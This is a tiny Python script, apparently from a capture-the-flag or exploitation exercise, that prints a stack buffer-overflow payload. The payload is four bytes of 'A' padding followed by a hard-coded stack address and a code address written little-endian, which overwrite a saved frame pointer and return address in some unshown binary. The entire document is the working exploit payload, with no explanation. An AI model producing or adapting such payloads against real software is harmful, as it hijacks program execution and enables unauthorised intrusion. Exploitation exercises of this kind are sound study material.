#!/usr/bin/env python3

import sys


sys.stdout.buffer.write(b'A'*4)
sys.stdout.buffer.write(0x7ffffff6ae40.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x401e46.to_bytes(8, 'little'))